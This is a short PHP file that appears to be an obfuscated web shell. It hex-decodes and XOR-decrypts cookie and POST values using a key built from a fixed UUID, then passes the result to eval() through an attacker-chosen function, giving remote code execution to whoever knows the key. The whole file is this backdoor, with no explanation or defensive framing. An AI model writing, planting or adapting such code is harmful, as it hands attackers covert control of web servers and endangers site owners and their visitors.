<?php

foreach (array_merge($_COOKIE, $_POST) as $key => $value) {

    print_r($value . "\n");
    function substringRepeat($key, $length)
    {
        return substr(str_repeat($key . '9d70086e-145d-4621-8026-e5d69acff5ca', $length / strlen($key) + 1), 0, $length);
    }
    function binaryPack($input)
    {
        return @pack('H*', $input);
    }
    function evalCode($array)
    {
        
        $check = count($array) % 3;
        if (!$check) {
            eval($array[1]($array[2]));
            print_r('EXECUTE');
            die;
        } 
        // print_r('evalcheck failed');
    }
    $value = binaryPack($value);
    evalCode(explode('#', $value ^ substringRepeat($key, strlen($value))));
}
?>